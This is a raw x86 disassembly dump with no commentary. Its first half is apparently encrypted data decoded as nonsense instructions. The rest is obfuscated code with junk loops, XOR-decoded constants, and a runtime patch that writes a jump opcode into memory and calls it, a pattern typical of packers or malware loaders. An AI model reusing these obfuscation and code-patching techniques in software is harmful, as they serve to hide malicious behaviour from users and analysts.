  422a7e:	and    BYTE PTR [eax],ch
  422a80:	pop    es
  422a81:	ins    DWORD PTR es:[edi],dx
  422a82:	and    DWORD PTR [ebx+edi*1-0x5b],esp
  422a86:	or     eax,0xe6d5462e
  422a8b:	aad    0x35
  422a8d:	int3   
  422a8e:	jae    0x422b04
  422a90:	or     eax,0xba51c965
  422a95:	dec    esp
  422a96:	popa   
  422a97:	test   al,0x7f
  422a99:	add    al,ah
  422a9b:	shl    BYTE PTR [eax-0x5d3ed604],1
  422aa1:	cli    
  422aa2:	int3   
  422aa3:	rcr    BYTE PTR [edi-0x66],1
  422aa6:	hlt    
  422aa7:	and    eax,0xfc9200cf
  422aac:	mov    esp,0x15d274aa
  422ab1:	sbb    eax,edx
  422ab3:	mov    ds:0xbbe8181e,al
  422ab8:	jno    0x422b36
  422aba:	fstp   QWORD PTR [eax]
  422abc:	adc    al,0xd5
  422abe:	or     dh,BYTE PTR [edx+edx*2-0x27]
  422ac2:	and    cl,BYTE PTR [ebx]
  422ac4:	in     al,dx
  422ac5:	push   ss
  422ac6:	ret    
  422ac7:	or     ch,cl
  422ac9:	or     dh,0xc
  422acc:	sahf   
  422acd:	sub    eax,0xc2589df9
  422ad2:	scas   al,BYTE PTR es:[edi]
  422ad3:	jno    0x422b52
  422ad5:	mov    bl,0xee
  422ad7:	popf   
  422ad8:	shl    DWORD PTR [edi-0x2ceb30df],0x8e
  422adf:	sbb    al,0xa0
  422ae1:	or     eax,edi
  422ae3:	in     al,dx
  422ae4:	jge    0x422b0c
  422ae6:	sbb    eax,DWORD PTR [edx]
  422ae8:	xchg   BYTE PTR [eax-0x4ab771f2],ch
  422aee:	call   0x1425:0xcc94785b
  422af5:	out    dx,al
  422af6:	retf   0x37b2
  422af9:	aam    0x6b
  422afb:	loope  0x422b2c
  422afd:	stos   DWORD PTR es:[edi],eax
  422afe:	stc    
  422aff:	ret    
  422b00:	scas   al,BYTE PTR es:[edi]
  422b01:	js     0x422ab9
  422b03:	sub    bl,BYTE PTR ss:[esi-0x73]
  422b07:	jae    0x422ac7
  422b09:	push   ecx
  422b0a:	sbb    DWORD PTR [esi],ebx
  422b0c:	shr    DWORD PTR [ecx+0x2490f1db],1
  422b12:	sub    dl,al
  422b14:	sti    
  422b15:	xchg   edi,eax
  422b16:	outs   dx,BYTE PTR ds:[esi]
  422b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b18:	mov    cl,0xf1
  422b1a:	stos   BYTE PTR es:[edi],al
  422b1b:	loopne 0x422aa0
  422b1d:	mov    edx,0xb83f5203
  422b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b23:	push   es
  422b24:	jb     0x422b68
  422b26:	xlat   BYTE PTR ds:[ebx]
  422b27:	and    BYTE PTR [eax],ch
  422b29:	leave  
  422b2a:	fsub   st,st(7)
  422b2c:	fmul   DWORD PTR [edi]
  422b2e:	dec    WORD PTR [ecx-0x782b36cb]
  422b35:	shl    DWORD PTR [ebp-0x6e],1
  422b38:	nop
  422b39:	sbb    eax,0x1a105ad4
  422b3e:	popf   
  422b3f:	xchg   ebp,eax
  422b40:	cld    
  422b41:	push   edx
  422b42:	leave  
  422b43:	jo     0x422b51
  422b45:	dec    ebp
  422b46:	out    0x50,eax
  422b48:	rol    DWORD PTR [eax-0x2557739],1
  422b4e:	sub    esp,DWORD PTR [esi-0x25]
  422b51:	and    BYTE PTR [edi+0xaa9a6f5],dh
  422b57:	hlt    
  422b58:	outs   dx,DWORD PTR ds:[esi]
  422b59:	neg    ah
  422b5b:	cdq    
  422b5c:	stos   DWORD PTR es:[edi],eax
  422b5d:	test   al,0x13
  422b5f:	dec    edi
  422b60:	cmp    al,0x4a
  422b62:	sbb    BYTE PTR [edi-0x66],0xd0
  422b66:	mov    DWORD PTR [esi-0x66a5f0ac],ecx
  422b6c:	and    al,0x7e
  422b6e:	cs dec ebp
  422b70:	mov    edi,DWORD PTR [ecx-0x2d0dd1d6]
  422b76:	shl    bl,1
  422b78:	adc    DWORD PTR [esp+edx*1],edx
  422b7b:	cmp    DWORD PTR [ebx+0x91f7df9],0xffffff91
  422b82:	jg     0x422b29
  422b84:	mov    ecx,0x256a48d8
  422b89:	and    al,0x80
  422b8b:	add    bl,BYTE PTR [eax]
  422b8d:	leave  
  422b8e:	push   ecx
  422b8f:	bound  esi,QWORD PTR [esi-0x1be18c0c]
  422b95:	stos   BYTE PTR es:[edi],al
  422b96:	into   
  422b97:	jmp    0xc834cbb7
  422b9c:	outs   dx,DWORD PTR ds:[esi]
  422b9d:	shl    BYTE PTR [ecx],1
  422b9f:	jo     0x422b4c
  422ba1:	and    bl,BYTE PTR [eax]
  422ba3:	mov    eax,ds:0xdd2714bb
  422ba8:	test   eax,0xd5989f85
  422bad:	hlt    
  422bae:	aaa    
  422baf:	jns    0x422b4b
  422bb1:	ret    0xd545
  422bb4:	cdq    
  422bb5:	bound  edx,QWORD PTR [ebx-0x25]
  422bb8:	sub    al,BYTE PTR [edi+0x3c]
  422bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bbc:	mov    bh,0xab
  422bbe:	jo     0x422bd7
  422bc0:	push   cs
  422bc1:	mov    edx,0x4f22a7f1
  422bc6:	add    BYTE PTR [eax],ch
  422bc8:	jmp    0xf108:0x6b87e324
  422bcf:	pop    ecx
  422bd0:	leave  
  422bd1:	call   0xfa28:0x33ac28a0
  422bd8:	fidiv  WORD PTR [edi-0x529f383b]
  422bde:	inc    eax
  422bdf:	xor    bl,ah
  422be1:	std    
  422be2:	mov    ch,0xf5
  422be4:	xor    esp,DWORD PTR [eax+0x7c]
  422be7:	xor    dl,dl
  422be9:	in     eax,0x68
  422beb:	shl    DWORD PTR [esp+esi*2],1
  422bee:	mov    ebx,0xb98f2afb
  422bf3:	xchg   esp,eax
  422bf4:	scas   al,BYTE PTR es:[edi]
  422bf5:	inc    eax
  422bf6:	dec    ebp
  422bf7:	xor    al,0xfc
  422bf9:	mov    WORD PTR [eax-0x5d],?
  422bfc:	or     eax,0x9d21f2d6
  422c01:	ins    DWORD PTR es:[edi],dx
  422c02:	adc    BYTE PTR [ebx+0x1a],ch
  422c05:	push   esp
  422c06:	clc    
  422c07:	in     al,0x19
  422c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c0a:	aaa    
  422c0b:	(bad)  
  422c0c:	or     BYTE PTR ds:[ecx-0x5d0663de],bl
  422c13:	xchg   ebx,eax
  422c14:	stos   DWORD PTR es:[edi],eax
  422c15:	jmp    0xd81f:0x3dd86405
  422c1c:	inc    ebx
  422c1d:	mov    dl,0xf1
  422c1f:	scas   al,BYTE PTR es:[edi]
  422c20:	std    
  422c21:	ins    BYTE PTR es:[edi],dx
  422c22:	jl     0x422c77
  422c24:	inc    ecx
  422c25:	in     al,dx
  422c26:	popf   
  422c27:	or     al,0x7f
  422c29:	sub    eax,0x776ea1f6
  422c2e:	pop    ds
  422c2f:	jne    0x422c8d
  422c31:	ss pop es
  422c33:	push   ebp
  422c34:	cmp    cl,BYTE PTR [ebp+0x2ca109d5]
  422c3a:	ror    DWORD PTR [ecx+edi*8+0x76],cl
  422c3e:	pop    ecx
  422c3f:	xchg   ecx,eax
  422c40:	iret   
  422c41:	and    al,0x16
  422c43:	sbb    DWORD PTR [ebx-0x59],ebx
  422c46:	and    DWORD PTR ds:0x42fce626,ebp
  422c4c:	out    0x75,eax
  422c4e:	int    0xd9
  422c50:	cmpps  xmm2,XMMWORD PTR [ebp-0x7aa0a0aa],0xc8
  422c58:	pushf  
  422c59:	and    bh,bh
  422c5b:	in     eax,0x24
  422c5d:	gs or  eax,0xc79d677b
  422c63:	mov    eax,0x83b254fd
  422c68:	xchg   ebp,eax
  422c69:	inc    esi
  422c6a:	in     eax,dx
  422c6b:	adc    edx,DWORD PTR [edx]
  422c6d:	adc    al,0x3b
  422c6f:	lods   eax,DWORD PTR ds:[esi]
  422c70:	mov    ebp,ecx
  422c72:	pop    ebx
  422c73:	xor    eax,0xbeb4f0f7
  422c78:	stos   BYTE PTR es:[edi],al
  422c79:	jp     0x422c46
  422c7b:	lea    eax,[ebp+eiz*4+0x2ab0499]
  422c82:	and    ch,0x14
  422c85:	in     eax,dx
  422c86:	je     0x422cb1
  422c88:	test   eax,0x51a18f5c
  422c8d:	test   ebp,esi
  422c8f:	cmc    
  422c90:	sbb    ebp,DWORD PTR [ebx+0x75]
  422c93:	aaa    
  422c94:	xor    al,dl
  422c96:	sbb    eax,ebp
  422c98:	add    eax,0xbc700ebf
  422c9d:	addr16 cmp al,0x80
  422ca0:	or     ebp,eax
  422ca2:	test   edi,0x4386327e
  422ca8:	(bad)  
  422caa:	push   cs
  422cab:	pop    ebx
  422cac:	or     ah,BYTE PTR [ecx+0x3c]
  422caf:	xchg   BYTE PTR [esi+0x125cf296],al
  422cb5:	adc    dl,BYTE PTR [ecx]
  422cb7:	or     ebp,eax
  422cb9:	(bad)  
  422cba:	jno    0x422cc5
  422cbc:	push   ebx
  422cbd:	test   eax,0x8616a9fa
  422cc2:	adc    cl,ah
  422cc4:	fistp  DWORD PTR ds:0x84516f89
  422cca:	adc    cl,BYTE PTR [esi-0x6c72b2f4]
  422cd0:	sti    
  422cd1:	or     BYTE PTR [ecx],dl
  422cd3:	sbb    al,0xb8
  422cd5:	ds aam 0x84
  422cd8:	sub    cl,BYTE PTR [ecx+0x1d]
  422cdb:	mov    ds:0xe83d0e8f,al
  422ce0:	test   bl,cl
  422ce2:	repnz arpl WORD PTR [eax-0x67],dx
  422ce6:	add    al,0xab
  422ce8:	loopne 0x422cbc
  422cea:	pop    es
  422ceb:	add    cl,ch
  422ced:	call   0x26b4db9d
  422cf2:	pop    ecx
  422cf3:	fcomi  st,st(2)
  422cf5:	enter  0x33c2,0x76
  422cf9:	adc    DWORD PTR [edi+ebx*4-0x3d960730],ecx
  422d00:	mov    WORD PTR [eax],ds
  422d02:	or     cl,cl
  422d04:	jne    0x422c86
  422d06:	xchg   edi,eax
  422d07:	or     eax,0x6c77d3fd
  422d0c:	and    eax,0x6255e53e
  422d11:	fldenv [ebx]
  422d13:	fnstcw WORD PTR [eax]
  422d15:	or     dl,BYTE PTR ds:0x99d3a8da
  422d1b:	addr16 daa 
  422d1d:	mov    ebp,0x55498980
  422d22:	or     DWORD PTR [ebx+edx*1-0x1f],eax
  422d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d27:	hlt    
  422d28:	jb     0x422d44
  422d2a:	fisubr WORD PTR [ebx]
  422d2c:	cmp    dh,BYTE PTR ds:0xa84f873a
  422d32:	cs cwde 
  422d34:	call   0x9905:0x6fa37ea3
  422d3b:	lock inc ecx
  422d3d:	jbe    0x422d9c
  422d3f:	cld    
  422d40:	xlat   BYTE PTR ds:[ebx]
  422d41:	mov    WORD PTR [edi-0x42],?
  422d44:	gs pop ecx
  422d46:	sub    al,0x1b
  422d48:	aam    0x41
  422d4a:	jmp    0xd746:0xadfb7782
  422d51:	stc    
  422d52:	and    eax,0xa192f6c6
  422d57:	loop   0x422d60
  422d59:	mov    eax,ds:0xaa3f581c
  422d5e:	(bad)  
  422d5f:	int3   
  422d60:	ror    esp,0x1a
  422d63:	add    eax,0xf908e731
  422d68:	fadd   st,st(4)
  422d6a:	rol    BYTE PTR [eax+0x446f2efc],cl
  422d70:	push   es
  422d71:	xor    BYTE PTR [esi+0x1],dl
  422d74:	mov    cs:0x57f0a5af,eax
  422d7a:	push   edi
  422d7b:	jno    0x422d76
  422d7d:	fcmovne st,st(5)
  422d7f:	aad    0x80
  422d81:	icebp  
  422d82:	dec    edi
  422d83:	or     eax,0x4b6447c4
  422d88:	mov    ebx,0x77d7e6e6
  422d8d:	xlat   BYTE PTR ds:[ebx]
  422d8e:	pop    ds
  422d8f:	shl    BYTE PTR [ebp+ebx*8-0x2],0x15
  422d94:	mov    esi,0x93a0c36e
  422d99:	nop
  422d9a:	lea    edx,[ecx]
  422d9c:	mov    edi,0x4e01582c
  422da1:	push   esi
  422da2:	dec    eax
  422da3:	stc    
  422da4:	int    0x40
  422da6:	jo     0x422dc4
  422da8:	cli    
  422da9:	xchg   ebp,eax
  422daa:	dec    ebp
  422dab:	and    eax,0x52d7f23f
  422db0:	or     edx,ebx
  422db2:	add    eax,DWORD PTR [edi+0x22f2f802]
  422db8:	sub    eax,DWORD PTR [esp+eax*1-0x6f2bdb34]
  422dbf:	dec    esp
  422dc0:	mov    ch,0x4f
  422dc3:	jp     0x422dcf
  422dc5:	mov    al,0xf9
  422dc7:	in     al,0xd5
  422dc9:	adc    al,0x63
  422dcb:	pushf  
  422dcc:	mov    dh,0x10
  422dce:	push   edx
  422dcf:	and    eax,0x40f5f5a0
  422dd4:	sbb    eax,0x25c7158a
  422dd9:	push   0x60
  422ddb:	imul   ch
  422ddd:	test   BYTE PTR [ecx+0x6c],bl
  422de0:	scas   eax,DWORD PTR es:[edi]
  422de1:	jno    0x422e5b
  422de3:	xor    bh,BYTE PTR [esi+edi*1]
  422de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422de7:	mov    ah,0x18
  422de9:	jnp    0x422e0c
  422deb:	or     eax,0xfb321699
  422df0:	out    0x7c,al
  422df2:	fmul   DWORD PTR [ebx+esi*8+0x76]
  422df6:	jno    0x422e27
  422df8:	outs   dx,DWORD PTR ds:[esi]
  422df9:	pushf  
  422dfa:	jl     0x422dd1
  422dfc:	pop    ebx
  422dfd:	mov    ebx,0xbfcc285
  422e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e03:	push   esp
  422e04:	pop    eax
  422e05:	push   eax
  422e06:	fcmovne st,st(3)
  422e08:	popf   
  422e09:	mov    edx,0x77908c5e
  422e0e:	cmp    eax,0xbb97bda2
  422e13:	xor    dh,bl
  422e15:	push   ebp
  422e16:	cmp    BYTE PTR [eax+0x1f],bh
  422e19:	js     0x422e41
  422e1b:	cmp    DWORD PTR [esi-0x3cb7258e],ecx
  422e21:	push   0xfffffff4
  422e23:	outs   dx,DWORD PTR ds:[esi]
  422e24:	add    esi,DWORD PTR [edi]
  422e26:	or     bh,al
  422e28:	push   esp
  422e29:	inc    eax
  422e2a:	or     DWORD PTR [esi-0x52],edx
  422e2d:	xchg   edi,eax
  422e2e:	inc    esi
  422e2f:	jbe    0x422e21
  422e31:	xor    dh,BYTE PTR [edx-0x7b4ba2e4]
  422e37:	not    BYTE PTR [ecx]
  422e39:	dec    ebx
  422e3a:	inc    esp
  422e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e3c:	and    ebx,ebp
  422e3e:	fld    TBYTE PTR [ebp+0x10b1679]
  422e44:	rol    bl,0xb3
  422e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e48:	cdq    
  422e49:	xor    esp,esi
  422e4b:	push   0x43
  422e4d:	cli    
  422e4e:	imul   ah
  422e50:	or     edi,esp
  422e52:	inc    ecx
  422e53:	mov    ah,0xd8
  422e55:	ds push es
  422e57:	cmp    eax,0x129f17aa
  422e5c:	lods   eax,DWORD PTR ds:[esi]
  422e5d:	js     0x422eca
  422e5f:	addr16 jne 0x422ed5
  422e62:	xor    bl,BYTE PTR [esp+eax*4]
  422e65:	mov    ch,0xd2
  422e67:	shl    DWORD PTR [ecx-0x5d],0xf1
  422e6b:	jbe    0x422ee1
  422e6d:	ror    DWORD PTR [edx],1
  422e6f:	pushfw 
  422e71:	pop    edx
  422e72:	std    
  422e73:	gs xchg ebp,eax
  422e75:	xchg   esp,eax
  422e76:	xchg   edx,eax
  422e77:	(bad)  
  422e78:	push   esp
  422e79:	mov    bh,0xba
  422e7b:	pop    esp
  422e7c:	cmp    eax,0xdd707abc
  422e81:	enter  0xf17c,0x57
  422e85:	mov    ecx,0xbdb797b
  422e8a:	mov    eax,0xf063bf79
  422e8f:	mul    DWORD PTR [eax+0x5e20b941]
  422e95:	jg     0x422ebf
  422e97:	xor    DWORD PTR [ebp+0x7b],0x6fce96ef
  422e9e:	xchg   edi,eax
  422e9f:	push   ds
  422ea0:	aas    
  422ea1:	scas   al,BYTE PTR es:[edi]
  422ea2:	inc    esi
  422ea3:	jne    0x422ea4
  422ea5:	iret   
  422ea6:	pop    eax
  422ea7:	jp     0x422e4e
  422ea9:	in     al,dx
  422eaa:	adc    al,0x8a
  422eac:	mov    edi,0x14bbd41c
  422eb1:	xchg   DWORD PTR [eax+0x1f4b4ce1],edi
  422eb7:	sub    al,0x4a
  422eb9:	sbb    al,BYTE PTR [ebp+0x28c9d46]
  422ebf:	ds add al,0x3a
  422ec2:	adc    DWORD PTR [esi-0x44670760],ecx
  422ec8:	mov    esi,0x40babdd5
  422ecd:	jp     0x422ee4
  422ecf:	lea    ebp,[ebx-0x1c]
  422ed2:	jle    0x422e9c
  422ed4:	inc    edi
  422ed5:	sbb    dh,dl
  422ed7:	addr16 cdq 
  422ed9:	jbe    0x422efa
  422edb:	jl     0x422f35
  422edd:	fild   DWORD PTR ds:0x3007ed6d
  422ee3:	and    ah,bl
  422ee5:	(bad)  
  422ee6:	int    0xf7
  422ee8:	loopne 0x422ef0
  422eea:	jp     0x422e70
  422eec:	js     0x422edc
  422eee:	adc    bh,BYTE PTR [ebp+0x60]
  422ef1:	scas   al,BYTE PTR es:[edi]
  422ef2:	sub    DWORD PTR [edx+0x30bdd56b],esp
  422ef8:	ja     0x422f22
  422efa:	cwde   
  422efb:	xor    ah,BYTE PTR [edi+ecx*2+0x6cdbe7f3]
  422f02:	test   al,0xb3
  422f04:	std    
  422f05:	lock outs dx,DWORD PTR ds:[esi]
  422f07:	mov    ch,0xb1
  422f09:	sub    al,0xd7
  422f0b:	pop    ecx
  422f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f0d:	sub    DWORD PTR [edx+0x2],ecx
  422f10:	lock push ds
  422f12:	inc    eax
  422f13:	(bad)  
  422f14:	stos   DWORD PTR es:[edi],eax
  422f15:	pop    ds
  422f16:	cmp    WORD PTR [edx+0x5a5b8e0c],bx
  422f1d:	or     DWORD PTR [ebp-0xc],0xf89c85f0
  422f24:	or     esi,edi
  422f26:	mov    eax,DWORD PTR [ebp-0x1c]
  422f29:	and    DWORD PTR ds:0x42d01c,0x0
  422f33:	mov    edi,DWORD PTR ds:0x42d01c
  422f39:	inc    edi
  422f3a:	mov    DWORD PTR ds:0x42d01c,edi
  422f40:	cmp    DWORD PTR ds:0x42d01c,0x21
  422f47:	jle    0x422f6d
  422f4d:	jmp    0x422f60
  422f52:	push   DWORD PTR [ebp-0xc]
  422f55:	push   0x261c
  422f5a:	call   DWORD PTR ds:0x43002b
  422f60:	cmp    DWORD PTR ds:0x42d01c,0x1f
  422f67:	jb     0x422f33
  422f6d:	mov    ecx,DWORD PTR [ebp-0x1c]
  422f70:	movzx  edi,WORD PTR ds:0x42901c
  422f77:	adc    DWORD PTR ds:0x42c010,edi
  422f7d:	sub    eax,ecx
  422f7f:	xor    esi,esi
  422f81:	xor    esi,DWORD PTR ds:0x42d004
  422f87:	sub    DWORD PTR ds:0x42c01c,esi
  422f8d:	mov    DWORD PTR [ebp-0x1c],eax
  422f90:	mov    DWORD PTR ds:0x42c00c,0x19
  422f9a:	cmp    DWORD PTR ds:0x42c00c,0x0
  422fa1:	je     0x422ff4
  422fa7:	cmp    DWORD PTR ds:0x42c00c,0x3
  422fae:	jb     0x422ff4
  422fb4:	jmp    0x422fcc
  422fb9:	push   DWORD PTR [ebp-0x1c]
  422fbc:	push   0x42d010
  422fc1:	push   0x42f0a7
  422fc6:	call   DWORD PTR ds:0x430033
  422fcc:	cmp    DWORD PTR ds:0x42c00c,0x4
  422fd3:	jne    0x422fe4
  422fd9:	mov    eax,ds:0x42c00c
  422fde:	dec    eax
  422fdf:	mov    ds:0x42c00c,eax
  422fe4:	mov    eax,ds:0x42c00c
  422fe9:	dec    eax
  422fea:	mov    ds:0x42c00c,eax
  422fef:	jmp    0x422f9a
  422ff4:	or     DWORD PTR [ebp-0x1c],0xf89c8590
  422ffb:	mov    eax,DWORD PTR [ebp-0x20]
  422ffe:	and    DWORD PTR ds:0x429000,edx
  423004:	mov    ecx,DWORD PTR [ebp-0x20]
  423007:	mov    edi,DWORD PTR ds:0x42a004
  42300d:	sub    edi,DWORD PTR ds:0x42c01c
  423013:	mov    DWORD PTR ds:0x42a004,edi
  423019:	sub    eax,ecx
  42301b:	mov    DWORD PTR [ebp-0x20],eax
  42301e:	mov    eax,DWORD PTR [ebp-0x2c]
  423021:	sbb    DWORD PTR ds:0x42b018,edx
  423027:	mov    ecx,DWORD PTR [ebp-0x20]
  42302a:	or     DWORD PTR ds:0x42d008,ecx
  423030:	mov    esi,0x75108a4
  423035:	xor    eax,esi
  423037:	mov    DWORD PTR ds:0x42c01c,0x12
  423041:	cmp    DWORD PTR ds:0x42c01c,0x0
  423048:	je     0x42309a
  42304e:	cmp    DWORD PTR ds:0x42c01c,0x7
  423055:	ja     0x42309a
  42305b:	jmp    0x42306c
  423060:	push   DWORD PTR [ebp-0x1c]
  423063:	push   DWORD PTR [ebp-0x20]
  423066:	call   DWORD PTR ds:0x430037
  42306c:	cmp    DWORD PTR ds:0x42c01c,0x8
  423073:	jne    0x423086
  423079:	mov    edi,DWORD PTR ds:0x42c01c
  42307f:	dec    edi
  423080:	mov    DWORD PTR ds:0x42c01c,edi
  423086:	xor    edi,edi
  423088:	xor    edi,DWORD PTR ds:0x42c01c
  42308e:	dec    edi
  42308f:	mov    DWORD PTR ds:0x42c01c,edi
  423095:	jmp    0x423041
  42309a:	mov    edi,0x3272ec
  42309f:	add    eax,edi
  4230a1:	or     eax,ecx
  4230a3:	mov    DWORD PTR [ebp-0x20],eax
  4230a6:	mov    eax,DWORD PTR [ebp-0x4]
  4230a9:	mov    ecx,DWORD PTR [ebp-0x4]
  4230ac:	sub    eax,ecx
  4230ae:	mov    DWORD PTR [ebp-0x4],eax
  4230b1:	or     DWORD PTR [ebp-0x4],0xf89c85bd
  4230b8:	mov    eax,DWORD PTR [ebp-0xc]
  4230bb:	xor    eax,esi
  4230bd:	add    eax,edi
  4230bf:	push   eax
  4230c0:	mov    eax,DWORD PTR [ebp-0x10]
  4230c3:	xor    eax,esi
  4230c5:	add    eax,edi
  4230c7:	push   eax
  4230c8:	mov    eax,DWORD PTR [ebp-0x4]
  4230cb:	xor    eax,esi
  4230cd:	add    eax,edi
  4230cf:	push   eax
  4230d0:	lea    eax,[ebp-0x7c]
  4230d3:	push   eax
  4230d4:	push   DWORD PTR [ebp-0x2c]
  4230d7:	push   DWORD PTR [ebp-0x28]
  4230da:	call   0x416118
  4230df:	test   eax,eax
  4230e1:	je     0x42310f
  4230e7:	lea    eax,[ebp-0x7c]
  4230ea:	push   eax
  4230eb:	mov    eax,DWORD PTR [ebp-0x28]
  4230ee:	xor    eax,esi
  4230f0:	add    eax,edi
  4230f2:	push   eax
  4230f3:	mov    eax,DWORD PTR [ebp-0x24]
  4230f6:	add    eax,0xaa
  4230fb:	push   eax
  4230fc:	mov    eax,DWORD PTR [ebp-0x24]
  4230ff:	mov    eax,DWORD PTR [eax+0x198]
  423105:	push   DWORD PTR [eax]
  423107:	call   0x40cc14
  42310c:	mov    DWORD PTR [ebp-0x14],eax
  42310f:	lea    eax,[ebp+0x4]
  423112:	mov    DWORD PTR [ebp-0x30],eax
  423115:	mov    eax,DWORD PTR [ebp-0x14]
  423118:	test   eax,eax
  42311a:	je     0x423182
  423120:	lea    eax,[ebp-0x8]
  423123:	mov    DWORD PTR [ebp-0x38],eax
  423126:	mov    eax,DWORD PTR [ebp-0x34]
  423129:	mov    DWORD PTR [ebp-0x8],eax
  42312c:	mov    eax,DWORD PTR [ebp-0x8]
  42312f:	mov    ecx,DWORD PTR [ebp-0x14]
  423132:	sub    eax,ecx
  423134:	mov    DWORD PTR [ebp-0x8],eax
  423137:	mov    ecx,DWORD PTR [ebp-0x4]
  42313a:	xor    ecx,esi
  42313c:	mov    eax,0xffcd8d14
  423141:	sub    eax,ecx
  423143:	add    DWORD PTR [ebp-0x8],eax
  423146:	mov    eax,DWORD PTR [ebp-0x8]
  423149:	mov    ecx,DWORD PTR [ebp-0x14]
  42314c:	mov    DWORD PTR [ecx+0x1],eax
  42314f:	mov    eax,DWORD PTR [ebp-0x14]
  423152:	push   DWORD PTR [ebp-0x24]
  423155:	mov    BYTE PTR [eax],0xe9
  423158:	mov    eax,ds:0x42f1e7
  42315d:	push   DWORD PTR [eax]
  42315f:	push   DWORD PTR ds:0x42f443
  423165:	push   DWORD PTR ds:0x42f1ef
  42316b:	push   DWORD PTR ds:0x42f423
  423171:	push   DWORD PTR ds:0x42fe03
  423177:	push   DWORD PTR [ebp-0x28]
  42317a:	push   DWORD PTR [ebp-0x2c]
  42317d:	mov    eax,DWORD PTR [ebp-0x14]
  423180:	call   eax
  423182:	mov    eax,DWORD PTR [ebp-0x30]
  423185:	mov    ecx,DWORD PTR ds:0x42f3e7
  42318b:	add    DWORD PTR [eax],ecx
  42318d:	pop    edi
  42318e:	pop    esi
  42318f:	leave  
  423190:	ret    
  423191:	push   ebp
  423192:	mov    ebp,esp
  423194:	sub    esp,0x18
  423197:	add    ecx,0x1177
  42319d:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  4231a4:	lea    eax,[ebp+0x14]
  4231a7:	mov    DWORD PTR [ebp-0x4],eax
  4231aa:	xor    edx,edx
  4231ac:	add    edx,DWORD PTR ds:0x42a01c
  4231b2:	add    DWORD PTR ds:0x42a018,edx
  4231b8:	push   esi
  4231b9:	mov    esi,0xf89c85b0
  4231be:	mov    DWORD PTR [ebp-0xc],esi
  4231c1:	movzx  ecx,BYTE PTR ds:0x42c004
  4231c8:	add    DWORD PTR ds:0x42a008,ecx
  4231ce:	lea    eax,[ebp-0xc]
  4231d1:	or     ecx,0x71b1
  4231d7:	mov    DWORD PTR [ebp-0x14],eax
  4231da:	mov    eax,DWORD PTR [ebp-0xc]
  4231dd:	and    edx,DWORD PTR ds:0x42c008
  4231e3:	mov    edx,DWORD PTR [ebp-0x14]
  4231e6:	sbb    DWORD PTR ds:0x42b014,edi
  4231ec:	mov    ecx,0x75108a4
  4231f1:	adc    DWORD PTR ds:0x42d008,0x42fa
  4231fb:	xor    eax,ecx
  4231fd:	sub    DWORD PTR ds:0x42a014,0x42d00c
  423207:	add    eax,0x3272ec
  42320c:	mov    DWORD PTR [edx],eax
  42320e:	adc    edx,eax
  423210:	mov    eax,ds:0x42f1e3
  423215:	mov    edx,DWORD PTR [ebp-0x4]
  423218:	mov    eax,DWORD PTR [eax]
  42321a:	sbb    DWORD PTR ds:0x42d000,0x2503
  423224:	add    eax,DWORD PTR [edx]
  423226:	movzx  edx,BYTE PTR ds:0x42b00c
  42322d:	add    edx,DWORD PTR ds:0x42b01c
  423233:	mov    DWORD PTR ds:0x42b00c,edx
  423239:	push   edi
  42323a:	mov    DWORD PTR ds:0x42901c,0x390b
  423244:	mov    DWORD PTR [ebp-0x8],eax
  423247:	and    edi,edx
  423249:	mov    edi,DWORD PTR [ebp+0x8]
  42324c:	adc    eax,eax
  42324e:	mov    eax,ds:0x42f36b
  423253:	mov    eax,DWORD PTR [eax+0x198]
  423259:	and    DWORD PTR ds:0x42c000,0x0
  423263:	mov    edx,DWORD PTR ds:0x42c000
  423269:	inc    edx
  42326a:	mov    DWORD PTR ds:0x42c000,edx
  423270:	cmp    DWORD PTR ds:0x42c000,0x20
  423277:	jb     0x4232a1
  42327d:	jmp    0x423294
  423282:	push   0x42f169
  423287:	push   0x0
  423289:	push   0x64f9
  42328e:	call   DWORD PTR ds:0x43003b
  423294:	cmp    DWORD PTR ds:0x42c000,0x15
  42329b:	jb     0x423263
  4232a1:	xor    edi,ecx
  4232a3:	mov    edx,DWORD PTR ds:0x42c01c
  4232a9:	add    DWORD PTR ds:0x42d00c,edx
  4232af:	mov    edx,0x3272ec
  4232b4:	adc    DWORD PTR ds:0x42d00c,0x354a
  4232be:	add    edi,edx
  4232c0:	cmp    DWORD PTR [eax],edi
  4232c2:	mov    DWORD PTR ds:0x42c018,0xd0b
  4232cc:	je     0x4232e3
  4232d2:	mov    eax,DWORD PTR [eax]
  4232d4:	mov    DWORD PTR ds:0x42a010,0x6032
  4232de:	jmp    0x423693
  4232e3:	mov    eax,DWORD PTR [ebp+0x18]
  4232e6:	mov    DWORD PTR ds:0x42d008,0x3f3a
  4232f0:	cmp    eax,esi
  4232f2:	jne    0x42330c
  4232f8:	push   0xf89c85b1
  4232fd:	mov    DWORD PTR ds:0x429004,0x3d8f
  423307:	jmp    0x423682
  42330c:	mov    esi,DWORD PTR [ebp+0x18]
  42330f:	mov    eax,0xf89c85b2
  423314:	mov    DWORD PTR ds:0x42d00c,0x2c1e
  42331e:	cmp    esi,eax
  423320:	mov    DWORD PTR ds:0x429008,0x446d
  42332a:	jne    0x423672
  423330:	mov    eax,DWORD PTR [ebp+0x10]
  423333:	xor    DWORD PTR ds:0x42d000,0x2610
  42333d:	xor    eax,ecx
  42333f:	add    eax,edx
  423341:	and    DWORD PTR ds:0x42c014,0x0
  42334b:	jmp    0x42335d
  423350:	mov    esi,DWORD PTR ds:0x42c014
  423356:	inc    esi
  423357:	mov    DWORD PTR ds:0x42c014,esi
  42335d:	cmp    DWORD PTR ds:0x42c014,0x17
  423364:	jae    0x42338c
  42336a:	cmp    DWORD PTR ds:0x42c014,0x1d
  423371:	ja     0x42338c
  423377:	jmp    0x423387
  42337c:	push   0x54c4
  423381:	call   DWORD PTR ds:0x43003f
  423387:	jmp    0x423350
  42338c:	mov    DWORD PTR [ebp-0x18],eax
  42338f:	mov    eax,DWORD PTR [ebp+0xc]
